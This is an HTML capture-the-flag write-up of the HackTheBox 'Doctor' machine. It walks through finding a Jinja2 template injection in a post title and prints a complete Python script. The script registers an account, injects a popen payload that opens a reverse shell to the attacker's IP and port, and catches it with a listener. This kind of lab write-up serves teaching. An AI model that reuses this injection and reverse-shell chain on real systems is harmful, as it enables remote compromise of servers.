<!DOCTYPE html>
<html>

<style>
body {

	background-image: url('images/cool-background.png');
	background-attachment: fixed;
	color: #333;
}

</style>

	<head>
	<title>HackTheBox Doctor Writeup </title>
	<!-- link to main stylesheet -->
	<link rel="stylesheet" type="css/main.css">
	</head>

	<body>
	<div class="container">
    	<div class="blurb">
        <h1>HTB Doctor</h1>

          <p>

	<img src="images/doctor/doc-head.PNG" alt="doctor" class="inline"/>    				<br/> <br/> <br/>

	We start out with the usual nmap scan                                     				<br/> <br/>
	<img src="images/doctor/doc-nmap.PNG" alt="nmap" class="inline"/>         				<br/> <br/> <br/>

	Points of interest here are a web server on port 80 and some sort of splunk server running on 8089 	<br/> <br/>
      	<img src="images/doctor/web-start-page.PNG" alt="web page" class="inline"/>         			<br/> <br/> <br/>
	<img src="images/doctor/splunk.PNG" alt="splunk" class="inline"/>         				<br/> <br/> <br/>


	We're not able to pull much info out of the splunk interface, since all the dirs require creds.
	The contact us page on the webserver has a link to the domain <b> doctors.htb </b>, this was sort of login portal	<br/> <br/>
	<img src="images/doctor/login-page.PNG" alt="nmap" class="inline"/>         						<br/> <br/> <br/>

	After creating a new account and logging in, there is a page to create a new post/comment.			 	<br/> <br/>
	<img src="images/doctor/inject1-post.PNG" alt="nmap" class="inline"/>         						<br/> <br/> <br/>
		  
	In the page source there is a hidden link to the /archive page, which appears to display our posts/comments.				<br/> <br/>
	<img src="images/doctor/archive.PNG" alt="nmap" class="inline"/> 									<br/> <br/> <br/>
		  
	The posts are not being sanitized whatsoever, and we can directly inject html in the /archive page. 					<br/> <br/>
	<img src="images/doctor/inject1.PNG" alt="nmap" class="inline"/>         								<br/> <br/> <br/>	  
	
	The challenge now becomes how can we inject html such that when	it gets executed we receive a reverse shell.				<br/> <br/>
	I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"> html injection resource here </a> <br/><br/>
	<img src="images/doctor/jinja2-basic.PNG" alt="web page" class="inline"/>         							<br/> <br/> <br/>
		  
	Initially I tried the basic injection. I tried to get the server to execute {4*4*4} so that when we query /archive, the number 64 is presented. 		<br/>
	We can see on the archive page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.		<br/> <br/><br/>

	After injecting 												<br/><br/>
	<code>
		&lt;/title&gt; &lt;/item&gt; {4*4*4}
	</code>														<br/> <br/><br/>

	The source code should look like										<br/><br/>
	<code>
		&lt;title&gt;&lt;item&gt; &lt;/title&gt;&lt;/item&gt; 64&lt;/title&gt;&lt;/item&gt;
	</code>														<br/> <br/><br/>

	We can see the expected output, 64, on the archive page								<br/> <br/>
	<img src="images/doctor/inject2.PNG" alt="basic injection" class="inline"/>         				<br/> <br/> <br/>

	As well as the expected source code										<br/> <br/>
	<img src="images/doctor/inject2-source.PNG" alt="basic injection" class="inline"/>         			<br/> <br/> <br/> <br/>

	Further down the github link there is a popen() method where it appears we can run shell commands.		<br/> <br/>
	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         				<br/> <br/> <br/>


	At this point we have all we need to get a shell. I started creating a python script to easily do all this.	<br/><br/>
	
	
	First step is to grab all of our headers/cookies on the 3 necessary requests. 					<br/> <br/>
	Registering a new account											<br/> <br/>
	<img src="images/doctor/burp-register-post.PNG" alt="register new account req" class="inline"/>         	<br/> <br/> <br/>
		  
	Login to new account												<br/> <br/>
	<img src="images/doctor/burp-login-post.PNG" alt="login to new account req" class="inline"/>         		<br/> <br/> <br/>
		  
	Post comment from new account											<br/> <br/>
	<img src="images/doctor/burp-post-comment.PNG" alt="create new comment req" class="inline"/>         		<br/> <br/> <br/><br/><br/>
	
	
	I then developed the below python script									</br> </br> </br>							
	<h1> User.py </h1>
	<pre>

	#!/usr/bin/python3

	from pwn import *
	import requests, time, random, string

	my_ip = "10.10.14.29"
	my_port = "8000"

	reg_url      = 'http://doctors.htb/register'
	login_url    = 'http://doctors.htb/login'
	home_url     = 'http://doctors.htb/home'
	inject_url   = 'http://doctors.htb/post/new'
	archive_url  = 'http://doctors.htb/archive'
	
	# generate a random string
	def get_random_string(length):
    		letters = string.ascii_lowercase
    		result_str = ''.join(random.choice(letters) for i in range(length))
    		return result_str

	user = get_random_string(6).capitalize()
	email = user + "@yahoo.com"

	# Exploit the SSTI by calling Popen without guessing the offset
	# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
	exploit = ""
	exploit += "</title> </item>"
	exploit += "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}"
	exploit += "{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;"
	exploit += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
	exploit += "s.connect((\\\""
	exploit +=  my_ip + "\\\","
	exploit +=  my_port + ")); "
	exploit += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
	exploit += "p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}"

	# the data for our 3 post requests, burpsuite 
	reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}
	login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}
	inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }

	with requests.Session() as session:

    		# Attempt to hit the register endpoint and create an account
    		get = session.get(reg_url)
    		post = session.post(reg_url, data=reg_dict)
    		if "Your account has been created, with a time limit of twenty minutes!" not in post.text:
        		print("[-] Account creation failed.. exiting")
        		exit(0)
    		print("[+] Created account " + email)

    		# Attempt to login with our new creds
    		login = session.post(login_url, data=login_dict)
    		if "Logout" not in login.text:
        		print("[-] Login failed.. exiting")
        		exit(0)
    		print("[+] Login success")

    		# Create our post with exploit string
    		injection = session.post(inject_url, data=inject_dict)
    		if "Your post has been created!" not in injection.text:
        		print("[-] Post creation failed.. exiting")
        		exit(0)
    		print("[+] Post created successfully")

    		# Startup listener and trigger our injected code
    		l = listen(my_port)
    		time.sleep(2)
    		print("[+] Querying /archive to trigger shell")
    		try:
        		archive = session.get(archive_url, timeout=0.5)
    		except:
        		l.interactive()
	</pre> <br/> <br/> <br/> <br/>

	The end result is a user shell as web on doctor.								<br/><br/>
	<img src="images/doctor/low-priv-script.PNG" alt="user script" class="inline"/>   				<br/> <br/> <br/>

	The script generates a random string, registers a new account under that string, logs in and creates a new post, 	<br/>
	starts up a nc listener, and finally visits the /archive page to trigger the connection.				<br/><br/>


        </p>
</div><!-- /.blurb -->
<div class="blurb">
</div><!-- /.container -->
</body>
</html>
